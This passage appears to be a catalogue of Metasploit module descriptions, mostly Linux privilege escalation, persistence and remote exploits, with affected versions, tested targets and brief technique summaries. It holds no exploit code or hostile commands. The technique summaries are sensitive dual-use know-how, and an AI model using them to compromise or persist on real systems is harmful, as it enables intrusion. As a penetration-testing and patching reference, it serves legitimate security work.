This module attempts to exploit two different CVEs related to overlayfs. CVE-2015-1328: Ubuntu specific -> 3.13.0-24 (14.04 default) < 3.13.0-55 3.16.0-25 (14.10 default) < 3.16.0-41 3.19.0-18 (15.04 default) < 3.19.0-21 CVE-2015-8660: Ubuntu: 3.19.0-18 < 3.19.0-43 4.2.0-18 < 4.2.0-23 (14.04.1, 15.10) Fedora: < 4.2.8 (vulnerable, un-tested) Red Hat: < 3.10.0-327 (rhel 6, vulnerable, un-tested)

linux/local/pihole_remove_commands_lpe
Pi-Hole versions 3.0 - 5.3 allows for command line input to the removecustomcname, removecustomdns, and removestaticdhcp functions without properly validating the parameters before passing to sed. When executed as the www-data user, this allows for a privilege escalation to root since www-data is in the sudoers.d/pihole file with no password.

linux/local/pkexec
A race condition flaw was found in the PolicyKit pkexec utility and polkitd daemon. A local user could use this flaw to appear as a privileged user to pkexec, allowing them to execute arbitrary commands as root by running those commands with pkexec. Those vulnerable include RHEL6 prior to polkit-0.96-2.el6_0.1 and Ubuntu libpolkit-backend-1 prior to 0.96-2ubuntu1.1 (10.10) 0.96-2ubuntu0.1 (10.04 LTS) and 0.94-1ubuntu1.1 (9.10)

linux/local/polkit_dbus_auth_bypass
A vulnerability exists within the polkit system service that can be leveraged by a local, unprivileged attacker to perform privileged operations. In order to leverage the vulnerability, the attacker invokes a method over D-Bus and kills the client process. This will occasionally cause the operation to complete without being subjected to all of the necessary authentication. The exploit module leverages this to add a new user with a sudo access and a known password. The new account is then leveraged to execute a payload with root privileges.

linux/local/ptrace_sudo_token_priv_esc
This module attempts to gain root privileges by blindly injecting into the session user's running shell processes and executing commands by calling `system()`, in the hope that the process has valid cached sudo tokens with root privileges. The system must have gdb installed and permit ptrace. This module has been tested successfully on: Debian 9.8 (x64); and CentOS 7.4.1708 (x64).

linux/local/ptrace_traceme_pkexec_helper
This module exploits an issue in ptrace_link in kernel/ptrace.c before Linux kernel 5.1.17. This issue can be exploited from a Linux desktop terminal, but not over an SSH session, as it requires execution from within the context of a user with an active Polkit agent. In the Linux kernel before 5.1.17, ptrace_link in kernel/ptrace.c mishandles the recording of the credentials of a process that wants to create a ptrace relationship, which allows local users to obtain root access by leveraging certain scenarios with a parent-child process relationship, where a parent drops privileges and calls execve (potentially allowing control by an attacker). One contributing factor is an object lifetime issue (which can also cause a panic). Another contributing factor is incorrect marking of a ptrace relationship as privileged, which is exploitable through (for example) Polkit's pkexec helper with PTRACE_TRACEME.

linux/local/rc_local_persistence
This module will edit /etc/rc.local in order to persist a payload. The payload will be executed on the next reboot.

linux/local/rds_atomic_free_op_null_pointer_deref_priv_esc
This module attempts to gain root privileges on Linux systems by abusing a NULL pointer dereference in the `rds_atomic_free_op` function in the Reliable Datagram Sockets (RDS) kernel module (rds.ko). Successful exploitation requires the RDS kernel module to be loaded. If the RDS module is not blacklisted (default); then it will be loaded automatically. This exploit supports 64-bit Ubuntu Linux systems, including distributions based on Ubuntu, such as Linux Mint and Zorin OS. Target offsets are available for: Ubuntu 16.04 kernels 4.4.0 <= 4.4.0-116-generic; and Ubuntu 16.04 kernels 4.8.0 <= 4.8.0-54-generic. This exploit does not bypass SMAP. Bypasses for SMEP and KASLR are included. Failed exploitation may crash the kernel. This module has been tested successfully on various 4.4 and 4.8 kernels.

linux/local/rds_rds_page_copy_user_priv_esc
This module exploits a vulnerability in the `rds_page_copy_user` function in `net/rds/page.c` (RDS) in Linux kernel versions 2.6.30 to 2.6.36-rc8 to execute code as root (CVE-2010-3904). This module has been tested successfully on: Fedora 13 (i686) kernel version 2.6.33.3-85.fc13.i686.PAE; and Ubuntu 10.04 (x86_64) with kernel version 2.6.32-21-generic.

linux/local/recvmmsg_priv_esc
This module attempts to exploit CVE-2014-0038, by sending a recvmmsg system call with a crafted timeout pointer parameter to gain root. This exploit has offsets for 3 Ubuntu 13 kernels: 3.8.0-19-generic (13.04 default); 3.11.0-12-generic (13.10 default); 3.11.0-15-generic (13.10). This exploit may take up to 13 minutes to run due to a decrementing (1/sec) pointer which starts at 0xff*3 (765 seconds)

linux/local/reptile_rootkit_reptile_cmd_priv_esc
This module uses Reptile rootkit's `reptile_cmd` backdoor executable to gain root privileges using the `root` command. This module has been tested successfully with Reptile from `master` branch (2019-03-04) on Ubuntu 18.04.3 (x64) and Linux Mint 19 (x64).

linux/local/service_persistence
This module will create a service on the box, and mark it for auto-restart. We need enough access to write service files and potentially restart services Targets: System V: CentOS <= 5 Debian <= 6 Kali 2.0 Ubuntu <= 9.04 Upstart: CentOS 6 Fedora >= 9, < 15 Ubuntu >= 9.10, <= 14.10 systemd: CentOS 7 Debian >= 7, <=8 Fedora >= 15 Ubuntu >= 15.04 Note: System V won't restart the service if it dies, only an init change (reboot etc) will restart it.

linux/local/servu_ftp_server_prepareinstallation_priv_esc
This module attempts to gain root privileges on systems running Serv-U FTP Server versions prior to 15.1.7. The `Serv-U` executable is setuid `root`, and uses `ARGV[0]` in a call to `system()`, without validation, when invoked with the `-prepareinstallation` flag, resulting in command execution with root privileges. This module has been tested successfully on Serv-U FTP Server version 15.1.6 (x64) on Debian 9.6 (x64).

linux/local/sock_sendpage
The Linux kernel failed to properly initialize some entries in the proto_ops struct for several protocols, leading to NULL being dereferenced and used as a function pointer. By using mmap(2) to map page 0, an attacker can execute arbitrary code in the context of the kernel. Several public exploits exist for this vulnerability, including spender's wunderbar_emporium and rcvalle's ppc port, sock_sendpage.c. All Linux 2.4/2.6 versions since May 2001 are believed to be affected: 2.4.4 up to and including 2.4.37.4; 2.6.0 up to and including 2.6.30.4 This module has been tested successfully on CentOS 5.0 (i386) with kernel version 2.6.18-8.1.1.tl5; and Debian 3.1r8 Sarge (i686) with kernel version 2.4.27-3-386.

linux/local/sophos_wpa_clear_keys
This module abuses a command injection on the clear_keys.pl perl script, installed with the Sophos Web Protection Appliance, to escalate privileges from the "spiderman" user to "root". This module is useful for post exploitation of vulnerabilities on the Sophos Web Protection Appliance web ui, executed by the "spiderman" user. This module has been tested successfully on Sophos Virtual Web Appliance 3.7.0.

linux/local/su_login
This module attempts to create a new login session by invoking the su command of a valid username and password. If the login is successful, a new session is created via the specified payload. Because su forces passwords to be passed over stdin, this module attempts to invoke a psuedo-terminal with python, python3, or script.

linux/local/sudo_baron_samedit
A heap based buffer overflow exists in the sudo command line utility that can be exploited by a local attacker to gain elevated privileges. The vulnerability was introduced in July of 2011 and affects version 1.8.2 through 1.8.31p2 as well as 1.9.0 through 1.9.5p1 in their default configurations. The technique used by this implementation leverages the overflow to overwrite a service_user struct in memory to reference an attacker controlled library which results in it being loaded with the elevated privileges held by sudo.

linux/local/sudoedit_bypass_priv_esc
This exploit takes advantage of a vulnerability in sudoedit, part of the sudo package. The sudoedit (aka sudo -e) feature mishandles extra arguments passed in the user-provided environment variables (SUDO_EDITOR, VISUAL, and EDITOR), allowing a local attacker to append arbitrary entries to the list of files to process. This can lead to privilege escalation. by appending extra entries on /etc/sudoers allowing for execution of an arbitrary payload with root privileges. Affected versions are 1.8.0 through 1.9.12.p1. However THIS module only works against Ubuntu 22.04 and 22.10. This module was tested against sudo 1.9.9-1ubuntu2 on Ubuntu 22.04, and 1.9.11p3-1ubuntu1 on Ubuntu 22.10.

linux/local/systemtap_modprobe_options_priv_esc
This module attempts to gain root privileges by exploiting a vulnerability in the `staprun` executable included with SystemTap version 1.3. The `staprun` executable does not clear environment variables prior to executing `modprobe`, allowing an arbitrary configuration file to be specified in the `MODPROBE_OPTIONS` environment variable, resulting in arbitrary command execution with root privileges. This module has been tested successfully on: systemtap 1.2-1.fc13-i686 on Fedora 13 (i686); and systemtap 1.1-3.el5 on RHEL 5.5 (x64).

linux/local/tomcat_rhel_based_temp_priv_esc
This module exploits a vulnerability in RedHat based systems where improper file permissions are applied to /usr/lib/tmpfiles.d/tomcat.conf for Apache Tomcat versions before 7.0.54-8. This may also work against The configuration files in tmpfiles.d are used by systemd-tmpfiles to manage temporary files including their creation. With this weak permission, we're able to inject commands into systemd-tmpfiles service to write a cron job to execute our payload. systemd-tmpfiles is executed by default on boot on RedHat-based systems through systemd-tmpfiles-setup.service. Depending on the system in use, the execution of systemd-tmpfiles could also be triggered by other services, cronjobs, startup scripts etc. This module was tested against Tomcat 7.0.54-3 on Fedora 21.

linux/local/tomcat_ubuntu_log_init_priv_esc
Tomcat (6, 7, 8) packages provided by default repositories on Debian-based distributions (including Debian, Ubuntu etc.) provide a vulnerable tomcat init script that allows local attackers who have already gained access to the tomcat account (for example, by exploiting an RCE vulnerability in a java web application hosted on Tomcat, uploading a webshell etc.) to escalate their privileges from tomcat user to root and fully compromise the target system. Tested against Tomcat 8.0.32-1ubuntu1.1 on Ubuntu 16.04

linux/local/ubuntu_enlightenment_mount_priv_esc
This module exploits a command injection within Enlightenment's enlightenment_sys binary. This is done by calling the mount command and feeding it paths which meet all of the system requirements, but execute a specific path as well due to a semi-colon being used. This module was tested on Ubuntu 22.04.1 X64 Desktop with enlightenment 0.25.3-1 (current at module write time)

linux/local/udev_netlink
Versions of udev < 1.4.1 do not verify that netlink messages are coming from the kernel. This allows local users to gain privileges by sending netlink messages from userland.

linux/local/ueb_bpserverd_privesc
It was discovered that the Unitrends bpserverd proprietary protocol, as exposed via xinetd, has an issue in which its authentication can be bypassed. A remote attacker could use this issue to execute arbitrary commands with root privilege on the target system. This is very similar to exploits/linux/misc/ueb9_bpserverd however it runs against the localhost by dropping a python script on the local file system. Unitrends stopped bpserverd from listening remotely on version 10.

linux/local/ufo_privilege_escalation
This module attempts to gain root privileges on Linux systems by abusing UDP Fragmentation Offload (UFO). This exploit targets only systems using Ubuntu (Trusty / Xenial) kernels 4.4.0-21 <= 4.4.0-89 and 4.8.0-34 <= 4.8.0-58, including Linux distros based on Ubuntu, such as Linux Mint. The target system must have unprivileged user namespaces enabled and SMAP disabled. Bypasses for SMEP and KASLR are included. Failed exploitation may crash the kernel. This module has been tested successfully on various Ubuntu and Linux Mint systems, including: Ubuntu 14.04.5 4.4.0-31-generic x64 Desktop; Ubuntu 16.04 4.8.0-53-generic; Linux Mint 17.3 4.4.0-89-generic; Linux Mint 18 4.8.0-58-generic

linux/local/vcenter_java_wrapper_vmon_priv_esc
This module exploits a privilege escalation in vSphere/vCenter due to improper permissions on the /usr/lib/vmware-vmon/java-wrapper-vmon file. It is possible for anyone in the cis group to write to the file, which will execute as root on vmware-vmon service restart or host reboot. This module was successfully tested against VMware VirtualCenter 6.5.0 build-7070488. The following versions should be vulnerable: vCenter 7.0 before U2c vCenter 6.7 before U3o vCenter 6.5 before U3q

linux/local/vmware_alsa_config
This module exploits a vulnerability in VMware Workstation Pro and Player on Linux which allows users to escalate their privileges by using an ALSA configuration file to load and execute a shared object as root when launching a virtual machine with an attached sound card. This module has been tested successfully on VMware Player version 12.5.0 on Debian Linux 8 Jessie.

linux/local/vmware_mount
VMWare Workstation (up to and including 9.0.2 build-1031769) and Player have a setuid executable called vmware-mount that invokes lsb_release in the PATH with popen(3). Since PATH is user-controlled, and the default system shell on Debian-derived distributions does not drop privs, we can put an arbitrary payload in an executable called lsb_release and have vmware-mount happily execute it as root for us.

linux/local/vmware_workspace_one_access_certproxy_lpe
VMware Workspace ONE Access contains a vulnerability whereby the horizon user can escalate their privileges to those of the root user by modifying a file and then restarting the vmware-certproxy service which invokes it. The service control is permitted via the sudo configuration without a password.

linux/local/vmware_workspace_one_access_cve_2022_22960
This module exploits CVE-2022-22960 which allows the user to overwrite the permissions of the certproxyService.sh script so that it can be modified by the horizon user. This allows a local attacker with the uid 1001 to escalate their privileges to root access.

linux/local/vmwgfx_fd_priv_esc
If the vmwgfx driver fails to copy the 'fence_rep' object to userland, it tries to recover by deallocating the (already populated) file descriptor. This is wrong, as the fd gets released via put_unused_fd() which shouldn't be used, as the fd table slot was already populated via the previous call to fd_install(). This leaves userland with a valid fd table entry pointing to a free'd 'file' object. We use this bug to overwrite a SUID binary with our payload and gain root. Linux kernel 4.14-rc1 - 5.17-rc1 are vulnerable. Successfully tested against Ubuntu 22.04.01 with kernel 5.13.12-051312-generic.

linux/local/yum_package_manager_persistence
This module will run a payload when the package manager is used. No handler is ran automatically so you must configure an appropriate exploit/multi/handler to connect. Module modifies a yum plugin to launch a binary of choice. grep -F 'enabled=1' /etc/yum/pluginconf.d/ will show what plugins are currently enabled on the system.

linux/local/zimbra_postfix_priv_esc
This module exploits a vulnerable sudo configuration that permits the zimbra user to execute postfix as root. In turn, postfix can execute arbitrary shellscripts, which means it can execute a root shell.

linux/local/zimbra_slapper_priv_esc
This module exploits CVE-2022-37393, which is a vulnerability in Zimbra's sudo configuration that permits the zimbra user to execute the zmslapd binary as root with arbitrary parameters. As part of its intended functionality, zmslapd can load a user-defined configuration file, which includes plugins in the form of .so files, which also execute as root.

linux/local/zpanel_zsudo
This module abuses the zsudo binary, installed with zpanel, to escalate privileges. In order to work, a session with access to zsudo on the sudoers configuration is needed. This module is useful for post exploitation of ZPanel vulnerabilities, where typically web server privileges are acquired, and this user is allowed to execute zsudo on the sudoers file.

linux/local/zyxel_suid_cp_lpe
This module exploits CVE-2022-30526, a local privilege escalation vulnerability that allows a low privileged user (e.g. nobody) escalate to root. The issue stems from a suid binary that allows all users to copy files as root. This module overwrites the firewall's crontab to execute an attacker provided script, resulting in code execution as root. In order to use this module, the attacker must first establish shell access. For example, by exploiting CVE-2022-30525. Known affected Zyxel models are: USG FLEX (50, 50W, 100W, 200, 500, 700), ATP (100, 200, 500, 700, 800), VPN (50, 100, 300, 1000), USG20-VPN and USG20W-VPN.

linux/misc/accellion_fta_mpipe2
This module exploits a chain of vulnerabilities in the Accellion File Transfer appliance. This appliance exposes a UDP service on port 8812 that acts as a gateway to the internal communication bus. This service uses Blowfish encryption for authentication, but the appliance ships with two easy to guess default authentication keys. This module abuses the known default encryption keys to inject a message into the communication bus. In order to execute arbitrary commands on the remote appliance, a message is injected into the bus destined for the 'matchrep' service. This service exposes a function named 'insert_plugin_meta_info' which is vulnerable to an input validation flaw in a call to system(). This provides access to the 'soggycat' user account, which has sudo privileges to run the primary admin tool as root. These two flaws are fixed in update version FTA_8_0_562.

linux/misc/aerospike_database_udf_cmd_exec
Aerospike Database versions before 5.1.0.3 permitted user-defined functions (UDF) to call the `os.execute` Lua function. This module creates a UDF utilising this function to execute arbitrary operating system commands with the privileges of the user running the Aerospike service. This module does not support authentication; however Aerospike Database Community Edition does not enable authentication by default. This module has been tested successfully on Ubuntu with Aerospike Database Community Edition versions 4.9.0.5, 4.9.0.11 and 5.0.0.10.

linux/misc/asus_infosvr_auth_bypass_exec
This module exploits an authentication bypass vulnerability in the infosvr service running on UDP port 9999 on various ASUS routers to execute arbitrary commands as root. This module launches the BusyBox Telnet daemon on the port specified in the TelnetPort option to gain an interactive remote shell. This module was tested successfully on an ASUS RT-N12E with firmware version 2.0.0.35. Numerous ASUS models are reportedly affected, but untested.

linux/misc/cisco_rv340_sslvpn
This module exploits a stack buffer overflow in the Cisco RV series routers SSL VPN functionality. The default SSL VPN configuration is exploitable, with no authentication required and works over the Internet! The stack is executable and no ASLR is in place, which makes exploitation easier. Successful execution of this module results in a reverse root shell. A custom payload is used as Metasploit does not have ARMLE null free shellcode. This vulnerability was presented by the Flashback Team in Pwn2Own Austin 2021 and OffensiveCon 2022. For more information check the referenced advisory. This module has been tested in firmware versions 1.0.03.15 and above and works with around 65% reliability. The service restarts automatically so you can keep trying until you pwn it. Only the RV340 router was tested, but other RV series routers should work out of the box.

linux/misc/cve_2020_13160_anydesk
The AnyDesk GUI is vulnerable to a remotely exploitable format string vulnerability. By sending a specially crafted discovery packet, an attacker can corrupt the frontend process when it loads or refreshes. While the discovery service is always running, the GUI frontend must be started to trigger the vulnerability. On successful exploitation, code is executed within the context of the user who started the AnyDesk GUI.

linux/misc/cve_2021_38647_omigod
By removing the authentication header, an attacker can issue an HTTP request to the OMI management endpoint that will cause it to execute an operating system command as the root user. This vulnerability was patched in OMI version 1.6.8-1 (released September 8th 2021).

linux/misc/gld_postfix
This module exploits a stack buffer overflow in the Salim Gasmi GLD <= 1.4 greylisting daemon for Postfix. By sending an overly long string the stack can be overwritten.

linux/misc/hp_nnmi_pmd_bof
This module exploits a stack buffer overflow in HP Network Node Manager I (NNMi). The vulnerability exists in the pmd service, due to the insecure usage of functions like strcpy and strcat while handling stack_option packets with user controlled data. In order to bypass ASLR this module uses a proto_tbl packet to leak an libov pointer from the stack and finally build the ROP chain to avoid NX.

linux/misc/hp_vsa_login_bof
This module exploits a buffer overflow vulnerability found in HP's StorageWorks P4000 VSA on versions prior to 10.0. The vulnerability is due to an insecure usage of the sscanf() function when parsing login requests. This module has been tested successfully on the HP VSA 9 Virtual Appliance.

linux/misc/hplip_hpssd_exec
This module exploits a command execution vulnerable in the hpssd.py daemon of the Hewlett-Packard Linux Imaging and Printing Project. According to MITRE, versions 1.x and 2.x before 2.7.10 are vulnerable. This module was written and tested using the Fedora 6 Linux distribution. On the test system, the daemon listens on localhost only and runs with root privileges. Although the configuration shows the daemon is to listen on port 2207, it actually listens on a dynamic port. NOTE: If the target system does not have a 'sendmail' command installed, this vulnerability cannot be exploited.

linux/misc/ib_inet_connect
This module exploits a stack buffer overflow in Borland InterBase by sending a specially crafted service attach request.

linux/misc/lprng_format_string
This module exploits a format string vulnerability in the LPRng print server. This vulnerability was discovered by Chris Evans. There was a publicly circulating worm targeting this vulnerability, which prompted RedHat to pull their 7.0 release. They consequently re-released it as "7.0-respin".

linux/misc/mongod_native_helper
This module exploits the nativeHelper feature from spiderMonkey which allows remote code execution by calling it with specially crafted arguments. This module has been tested successfully on MongoDB 2.2.3 on Ubuntu 10.04 and Debian Squeeze.

linux/misc/nagios_nrpe_arguments
The Nagios Remote Plugin Executor (NRPE) is installed to allow a central Nagios server to actively poll information from the hosts it monitors. NRPE has a configuration option dont_blame_nrpe which enables command-line arguments to be provided remote plugins. When this option is enabled, even when NRPE makes an effort to sanitize arguments to prevent command execution, it is possible to execute arbitrary commands.

linux/misc/netcore_udp_53413_backdoor
Routers manufactured by Netcore, a popular brand for networking equipment in China, have a wide-open backdoor that can be fairly easily exploited by attackers. These products are also sold under the Netis brand name outside of China. This backdoor allows cyber criminals to easily run arbitrary code on these routers, rendering it vulnerable as a security device. Some models include a non-standard echo command which doesn't honor -e, and are therefore not currently exploitable with Metasploit. See URLs or module markdown for additional options.

linux/misc/netsupport_manager_agent
This module exploits a buffer overflow in NetSupport Manager Agent. It uses a similar ROP to the proftpd_iac exploit in order to avoid non executable stack.

linux/misc/nimbus_gettopologyhistory_cmd_exec
This module exploits an unauthenticated command injection vulnerability within the Nimbus service component of Apache Storm. The getTopologyHistory RPC method method takes a single argument which is the name of a user which is concatenated into a string that is executed by bash. In order for the vulnerability to be exploitable, there must have been at least one topology submitted to the server. The topology may be active or inactive, but at least one must be present. Successful exploitation results in remote code execution as the user running Apache Storm. This vulnerability was patched in versions 2.1.1, 2.2.1 and 1.2.4. This exploit was tested on version 2.2.0 which is affected.

linux/misc/novell_edirectory_ncp_bof
This exploit abuses a buffer overflow vulnerability in Novell eDirectory. The vulnerability exists in the ndsd daemon, specifically in the NCP service, while parsing a specially crafted Keyed Object Login request. It allows remote code execution with root privileges.

linux/misc/opennms_java_serialize
This module exploits a vulnerability in the OpenNMS Java object which allows an unauthenticated attacker to run arbitrary code against the system.

linux/misc/qnap_transcode_server
This module exploits an unauthenticated remote command injection vulnerability in QNAP NAS devices. The transcoding server listens on port 9251 by default and is vulnerable to command injection using the 'rmfile' command. This module was tested successfully on a QNAP TS-431 with firmware version 4.3.3.0262 (20170727).

linux/misc/quest_pmmasterd_bof
This modules exploits a buffer overflow in the Quest Privilege Manager, a software used to integrate Active Directory with Linux and Unix systems. The vulnerability exists in the pmmasterd daemon, and can only triggered when the host has been configured as a policy server ( Privilege Manager for Unix or Quest Sudo Plugin). A buffer overflow condition exists when handling requests of type ACT_ALERT_EVENT, where the size of a memcpy can be controlled by the attacker. This module only works against version < 6.0.0-27. Versions up to 6.0.0-50 are also vulnerable, but not supported by this module (a stack cookie bypass is required). NOTE: To use this module it is required to be able to bind a privileged port ( <=1024 ) as the server refuses connections coming from unprivileged ports, which in most situations means that root privileges are required.

linux/misc/saltstack_salt_unauth_rce
This module exploits unauthenticated access to the runner() and _send_pub() methods in the SaltStack Salt master's ZeroMQ request server, for versions 2019.2.3 and earlier and 3000.1 and earlier, to execute code as root on either the master or on select minions. VMware vRealize Operations Manager versions 7.5.0 through 8.1.0, as well as Cisco Modeling Labs Corporate Edition (CML) and Cisco Virtual Internet Routing Lab Personal Edition (VIRL-PE), for versions 1.2, 1.3, 1.5, and 1.6 in certain configurations, are known to be affected by the Salt vulnerabilities. Tested against SaltStack Salt 2019.2.3 and 3000.1 on Ubuntu 18.04, as well as Vulhub's Docker image.

linux/misc/sercomm_exec
This module will cause remote code execution on several SerComm devices. These devices typically include routers from NetGear and Linksys. This module was tested successfully against several NetGear, Honeywell and Cisco devices.

linux/misc/tplink_archer_a7_c7_lan_rce
This module exploits a command injection vulnerability in the tdpServer daemon (/usr/bin/tdpServer), running on the router TP-Link Archer A7/C7 (AC1750), hardware version 5, MIPS Architecture, firmware version 190726. The vulnerability can only be exploited by an attacker on the LAN side of the router, but the attacker does not need any authentication to abuse it. After exploitation, an attacker will be able to execute any command as root, including downloading and executing a binary from another host. This vulnerability was discovered and exploited at Pwn2Own Tokyo 2019 by the Flashback team (Pedro Ribeiro + Radek Domanski). This module was updated in November 2020, after a bypass was discovered for the patch TP-Link issued. The new injection technique works on older firmware too. All firmware versions up to (but excluding) releases 201029 and 201030 are exploitable.

linux/misc/ueb9_bpserverd
It was discovered that the Unitrends bpserverd proprietary protocol, as exposed via xinetd, has an issue in which its authentication can be bypassed. A remote attacker could use this issue to execute arbitrary commands with root privilege on the target system.

linux/misc/unidata_udadmin_auth_bypass
This module exploits an authentication bypass vulnerability in the Linux version of udadmin_server, which is an RPC service that comes with the Rocket Software UniData server. This affects versions of UniData prior to 8.2.4 build 3003. This service typically runs as root. It accepts a username of ":local:" and a password in the form of "<username>:<uid>:<gid>", where username and uid must be a valid account, but gid can be anything except 0. This exploit takes advantage of this login account to authenticate as a chosen user and run an arbitrary command (using the built-in OsCommand message).

linux/misc/unidata_udadmin_password_stack_overflow
This modlue exploits an authentication bypass vulnerability in the Linux version of udadmin_server, which is an RPC service that comes with the Rocket Software UniData server, which runs as root. This vulnerability affects UniData versions 8.2.4 build 3003 and earlier (for Linux), but this module specifically targets UniData version 8.2.4 build 3001. Other versions will crash the forked process, but will not otherwise affect the RPC server. The username and password fields are copied to a stack-based buffer using a function that's equivalent to strcpy() (ie, has no bounds checking). Additionally, the password field is encoded in such a way that we can include NUL bytes.

linux/misc/zabbix_server_exec
This module abuses the "Command" trap in Zabbix Server to execute arbitrary commands without authentication. By default the Node ID "0" is used, if it doesn't work, the Node ID is leaked from the error message and exploitation retried. According to the vendor versions prior to 1.6.9 are vulnerable. The vulnerability has been successfully tested on Zabbix Server 1.6.7 on Ubuntu 10.04.

linux/misc/zyxel_ike_decoder_rce_cve_2023_28771
This module exploits a remote unauthenticated command injection vulnerability in the Internet Key Exchange (IKE) packet decoder over UDP port 500 on the WAN interface of several Zyxel devices. The affected devices are as follows: ATP (Firmware version 4.60 to 5.35 inclusive), USG FLEX (Firmware version 4.60 to 5.35 inclusive), VPN (Firmware version 4.60 to 5.35 inclusive), and ZyWALL/USG (Firmware version 4.60 to 4.73 inclusive). The affected devices are vulnerable in a default configuration and command execution is with root privileges.

linux/misc/zyxel_multiple_devices_zhttp_lan_rce
This module exploits a buffer overflow in the zhttpd binary (/bin/zhttpd). It is present on more than 40 Zyxel routers and CPE devices. The code execution vulnerability can only be exploited by an attacker if the zhttp webserver is reachable. No authentication is required. After exploitation, an attacker will be able to execute any command as root, including downloading and executing a binary from another host.

linux/mysql/mysql_yassl_getname
This module exploits a stack buffer overflow in the yaSSL (1.9.8 and earlier) implementation bundled with MySQL. By sending a specially crafted client certificate, an attacker can execute arbitrary code. This vulnerability is present within the CertDecoder::GetName function inside "taocrypt/src/asn.cpp". However, the stack buffer that is written to exists within a parent function's stack frame. NOTE: This vulnerability requires a non-default configuration. First, the attacker must be able to pass the host-based authentication. Next, the server must be configured to listen on an accessible network interface. Lastly, the server must have been manually configured to use SSL. The binary from version 5.5.0-m2 was built with /GS and /SafeSEH. During testing on Windows XP SP3, these protections successfully prevented exploitation. Testing was also done with mysql on Ubuntu 9.04. Although the vulnerable code is present, both version 5.5.0-m2 built from source and version 5.0.75 from a binary package were not exploitable due to the use of the compiler's FORTIFY feature. Although suse11 was mentioned in the original blog post, the binary package they provide does not contain yaSSL or support SSL.

linux/mysql/mysql_yassl_hello
This module exploits a stack buffer overflow in the yaSSL (1.7.5 and earlier) implementation bundled with MySQL <= 6.0. By sending a specially crafted Hello packet, an attacker may be able to execute arbitrary code.

linux/pop3/cyrus_pop3d_popsubfolders
This exploit takes advantage of a stack based overflow. Once the stack corruption has occurred it is possible to overwrite a pointer which is later used for a memcpy. This gives us a write anything anywhere condition similar to a format string vulnerability. NOTE: The popsubfolders option is a non-default setting. I chose to overwrite the GOT with my shellcode and return to it. This defeats the VA random patch and possibly other stack protection features. Tested on gentoo-sources Linux 2.6.16. Although Fedora CORE 5 ships with a version containing the vulnerable code, it is not exploitable due to the use of the FORTIFY_SOURCE compiler enhancement

linux/postgres/postgres_payload
On some default Linux installations of PostgreSQL, the postgres service account may write to the /tmp directory, and may source UDF Shared Libraries from there as well, allowing execution of arbitrary code. This module compiles a Linux shared object file, uploads it to the target host via the UPDATE pg_largeobject method of binary injection, and creates a UDF (user defined function) from that shared object. Because the payload is run as the shared object's constructor, it does not need to conform to specific Postgres API versions.

linux/pptp/poptop_negative_read
This is an exploit for the Poptop negative read overflow. This will work against versions prior to 1.1.3-b3 and 1.1.3-20030409, but I currently do not have a good way to detect Poptop versions. The server will by default only allow 4 concurrent manager processes (what we run our code in), so you could have a max of 4 shells at once. Using the current method of exploitation, our socket will be closed before we have the ability to run code, preventing the use of Findsock.

linux/proxy/squid_ntlm_authenticate
This is an exploit for Squid\'s NTLM authenticate overflow (libntlmssp.c). Due to improper bounds checking in ntlm_check_auth, it is possible to overflow the 'pass' variable on the stack with user controlled data of a user defined length. Props to iDEFENSE for the advisory.

linux/redis/redis_debian_sandbox_escape
This module exploits CVE-2022-0543, a Lua-based Redis sandbox escape. The vulnerability was introduced by Debian and Ubuntu Redis packages that insufficiently sanitized the Lua environment. The maintainers failed to disable the package interface, allowing attackers to load arbitrary libraries. On a typical `redis` deployment (not docker), this module achieves execution as the `redis` user. Debian/Ubuntu packages run Redis using systemd with the "MemoryDenyWriteExecute" permission, which limits some of what an attacker can do. For example, staged meterpreter will fail when attempting to use mprotect. As such, stageless meterpreter is the preferred payload. Redis can be configured with authentication or not. This module will work with either configuration (provided you provide the correct authentication details). This vulnerability could theoretically be exploited across a few architectures: i386, arm, ppc, etc. However, the module only supports x86_64, which is likely to be the most popular version.

linux/redis/redis_replication_cmd_exec
This module can be used to leverage the extension functionality added since Redis 4.0.0 to execute arbitrary code. To transmit the given extension it makes use of the feature of Redis which called replication between master and slave.

linux/samba/chain_reply
This exploits a memory corruption vulnerability present in Samba versions prior to 3.3.13. When handling chained response packets, Samba fails to validate the offset value used when building the next part. By setting this value to a number larger than the destination buffer size, an attacker can corrupt memory. Additionally, setting this value to a value smaller than 'smb_wct' (0x24) will cause the header of the input buffer chunk to be corrupted. After close inspection, it appears that 3.0.x versions of Samba are not exploitable. Since they use an "InputBuffer" size of 0x20441, an attacker cannot cause memory to be corrupted in an exploitable way. It is possible to corrupt the heap header of the "InputBuffer", but it didn't seem possible to get the chunk to be processed again prior to process exit. In order to gain code execution, this exploit attempts to overwrite a "talloc chunk" destructor function pointer. This particular module is capable of exploiting the flaw on x86 Linux systems that do not have the nx memory protection. NOTE: It is possible to make exploitation attempts indefinitely since Samba forks for user sessions in the default configuration.

linux/samba/is_known_pipename
This module triggers an arbitrary shared library load vulnerability in Samba versions 3.5.0 to 4.4.14, 4.5.10, and 4.6.4. This module requires valid credentials, a writeable folder in an accessible share, and knowledge of the server-side path of the writeable folder. In some cases, anonymous access combined with common filesystem locations can be used to automatically exploit this vulnerability.

linux/samba/lsa_transnames_heap
This module triggers a heap overflow in the LSA RPC service of the Samba daemon. This module uses the TALLOC chunk overwrite method (credit Ramon and Adriano), which only works with Samba versions 3.0.21-3.0.24. Additionally, this module will not work when the Samba "log level" parameter is higher than "2".

linux/samba/setinfopolicy_heap
This module triggers a vulnerability in the LSA RPC service of the Samba daemon because of an error on the PIDL auto-generated code. Making a specially crafted call to SetInformationPolicy to set a PolicyAuditEventsInformation allows to trigger a heap overflow and finally execute arbitrary code with root privileges. The module uses brute force to guess the stackpivot/rop chain or the system() address and redirect flow there in order to bypass NX. The start and stop addresses for brute forcing have been calculated empirically. On the other hand the module provides the StartBrute and StopBrute which allow the user to configure his own addresses.

linux/samba/trans2open
This exploits the buffer overflow found in Samba versions 2.2.0 to 2.2.8. This particular module is capable of exploiting the flaw on x86 Linux systems that do not have the noexec stack option set. NOTE: Some older versions of RedHat do not seem to be vulnerable since they apparently do not allow anonymous access to IPC.

linux/smtp/apache_james_exec
